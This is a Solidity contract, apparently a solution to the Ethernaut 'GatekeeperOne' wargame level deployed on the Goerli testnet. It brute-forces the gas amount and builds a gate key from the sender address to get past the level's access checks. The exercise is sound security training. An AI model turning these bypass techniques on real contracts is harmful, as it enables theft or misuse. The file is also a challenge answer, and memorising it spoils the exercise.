// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "@openzeppelin/contracts/math/SafeMath.sol";
import "../lessons/13-GatekeeperOne.sol";

/**
 * Alternative version of the contract used to pass the level on Goerli network
 */
contract GatekeeperOneAttack {
    GatekeeperOne gatekeeperOne;

    event Success(uint256 gas);
    event Failure(uint16 a, uint16 b);

    constructor(address _gatekeeperOneAddress) public {
        gatekeeperOne = GatekeeperOne(_gatekeeperOneAddress);
    }

    function enterBruteForce(uint16 a, uint16 b) public {
        bytes8 gateKey = getGateKey();
        bool success = false;
        for (uint16 i = a; i < b; i++) {
            (bool callSuccess, ) = address(gatekeeperOne).call.gas(i + (8191 * 3))(
                abi.encodeWithSignature("enter(bytes8)", gateKey)
            );
            if (callSuccess) {
                emit Success(i + 8191 * 3);
                success = true;
            }
        }
        if (!success) {
            emit Failure(a, b);
        }
    }

    function getGateKey() public view returns (bytes8) {
        return bytes8(0x1000000000000000 + uint16(msg.sender));
    }
}
